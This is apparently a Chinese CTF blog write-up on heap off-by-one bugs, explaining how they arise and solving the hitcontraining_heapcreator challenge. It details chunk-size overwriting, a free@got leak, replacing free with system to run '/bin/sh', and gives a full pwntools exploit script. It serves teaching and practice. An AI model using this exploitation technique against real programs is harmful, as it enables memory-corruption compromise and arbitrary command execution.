---
title: Off-By-One
tags: [ctf-pwn,heap]
date: 2022-11-27 19:00:00
categories: [ctf-pwn]
excerpt: 堆中的 off-by-one 漏洞, hitcon_heapcreator exp
---

#### Off-By-One漏洞如何产生

1. 循环多一次

   ```C
   x = malloc(10);
   for(int i=0;i<=10;i++)
   {
       x[i] = getchar();
   }
   ```

   x的下一个chunk第一个字节被溢出了

2. `strlen`和`strcpy`行为不一致

   ```C
   if(strlen(buffer)==100)
   {
       strcpy(chunk,buffer);
   }
   ```

   `strlen`返回值不算结束符'`\0`，而`strcpy`复制时会把结束符在内的101个字符复制过去
   
   

#### hitcon_creator

题目来源

<https://buuoj.cn/challenges#hitcontraining_heapcreator>

##### 1. create

![](/img/ctf-pwn/off_by_one/1.png)

从上述结构可以推断出heaparray是如下结构

```C
struct heaparray_item{
    int_64   size;
    char * content;
}
struct heaparray_item * heaparray[10];
```



##### 2. edit

```C
if ( *(&heaparray + v1) )
{
    printf("Content of heap : ");
    read_input(*((_QWORD *)*(&heaparray + v1) + 1), *(_QWORD *)*(&heaparray + v1) + 1LL);
    puts("Done !");
}
```

`read_input`读取size+1字节，出现了off_by_one漏洞

可以覆盖下一个chunk的size字段



##### 漏洞利用

1. 申请三个堆块，大小为0x18,0x10,0x10，加上三次size申请的0x10，一共6个chunk

    ![](/img/ctf-pwn/off_by_one/2.jpg)

2. 修改0号块，写入`/bin/sh`，然后再溢出`0x81`到下一个chunk的size

   ![](/img/ctf-pwn/off_by_one/3.jpg)

3. 这时delete chunk 1，会合并到前一个chunk（也就是1的size所在chunk）中

    ![](/img/ctf-pwn/off_by_one/4.jpg)

    观察bins，发现这个chunk被free到fastbin的0x80节点上（0x20上也有一个chunk是因为delete也会将size释放掉）

    ![](/img/ctf-pwn/off_by_one/5.jpg)

4. 申请一个新的chunk，将0x80这个块申请出来，因此malloc的大小需要为0x70

    同时，在2号的content位置写入`free@got`

    这时调用show(2)会泄露free的地址

    ![](/img/ctf-pwn/off_by_one/6.jpg)

5. 泄露libc基址找到system地址

6. `edit(2,p64(system_addr))`时，会修改content指针指向的内容，而content指针被`free@got`替换掉了，所以free的got表被修改成了`system@got`上的地址

7. 然后`delete(0)`时，首先要free掉`heaparray[0].content`上的内容，但是由于free被替换成了system，结果就变成了以content指针为参数调用system函数的情况，而`heaparray[0].content`恰好是之前写过的`/bin/sh`，因此执行了`system('/bin/sh')

   

##### 完整exp

> libcsearcher挑版本为2.23的

```python
from pwn import *
from LibcSearcher import *
r = process('./heapcreator')
#r = remote('node4.buuoj.cn',26117)
elf = ELF('./heapcreator')

def add(size,content):
    r.sendlineafter("choice :",'1')
    r.sendlineafter("Heap : ",str(size))
    r.sendlineafter("heap:",content)

def edit(idx,content):
    r.sendlineafter("choice :",'2')
    r.sendlineafter("Index :",str(idx))
    r.sendlineafter("heap : ",content)

def show(idx):
    r.sendlineafter("choice :",'3')
    r.sendlineafter("Index :",str(idx))

def delete(idx):
    r.sendlineafter("choice :",'4')
    r.sendlineafter("Index :",str(idx))

free_got = elf.got['free']

add(0x18,"MMMM")
add(0x10,"MMMM")
add(0x10,"MMMM")
#gdb.attach(r)

edit(0,b'/bin/sh\x00'+p64(0)*2+b'\x81')
#gdb.attach(r)

delete(1)
#gdb.attach(r)

add(0x70,p64(1)*8+p64(0x8)+p64(free_got))
show(2)
#gdb.attach(r)

free_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

#libc
libc = LibcSearcher('free',free_addr)
offset = free_addr-libc.dump('free')
system_addr = offset + libc.dump('system')

edit(2,p64(system_addr))
#gdb.attach(r)
delete(0)

r.interactive()
```

